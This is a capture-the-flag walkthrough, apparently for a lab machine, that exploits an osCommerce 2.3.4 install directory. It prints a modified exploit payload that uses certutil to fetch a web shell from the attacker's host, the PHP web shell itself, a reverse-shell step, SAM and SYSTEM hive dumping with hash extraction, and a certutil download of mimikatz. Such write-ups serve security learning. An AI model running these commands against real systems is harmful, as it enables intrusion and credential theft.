Initial scans revealed a ton of ports, I mean A TON!
8080, 445 were the ones that helped us
8080 had a oscommerce-2.3.4 dir, which, on searching on searchsploit, seemed vulnerable to file inclusion and rce, provided the /install dir hasnt been removed by the administrator
So, in the oscommerce-2.3.4/catalog , we did a gobuster search to find the /install present

Also mounted the share
`sudo mount -t cifs //10.201.9.132/Users /tmp/blueprint -o username=guest`

---
We modify the 44374.py with the base url, and target url, mainly IP and ports.
Also, we modified the payload as
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.17.34.38/php_shell_exec.php shell.php");' 
The shell_exec.php was served locally with the content
<?php echo shell_exec($_GET["cmd"]); ?>

Effectively, when we visit the /install/include/configuration.php page, it will fetch the shell_exec.php from localhost and create the file in /catalog/install/includes
We click on the shell.php, and write the command we want to run in the url as
/catalog/install/includes/shell.php?cmd=whoami

With this, we know we can run a windows command in that url, so we upload a powershell one liner after we url-encode it, and run the url, with listening nc
Shell!
We get the NT Authority shell, so root.txt is not an issue
To get the decrypted hash of User Lab's password, we need 2 files
```
reg save HKLM\SAM sam.save  
reg save HKLM\SYSTEM system.save
```
If we do it in C:\Users\Public, since it is mounted with kali's /tmp/blueprint, we can directly access the hives from kali

---
Then use impacket-secretsdump to get the hashes
`impacket-secretsdump -ts local -system system.save -sam sam.save`
Go to crackstation and crack the NTLM hash. done!

---
---
---
Alternatively, we can also run the mimikatz on the windows machine, which will dump those hashes. But it wasnt running for me, for some reason
certutil -urlcache -f http://10.17.34.38/mimikatz.exe mim.exe
to transfer it, and mim.exe to run it

---
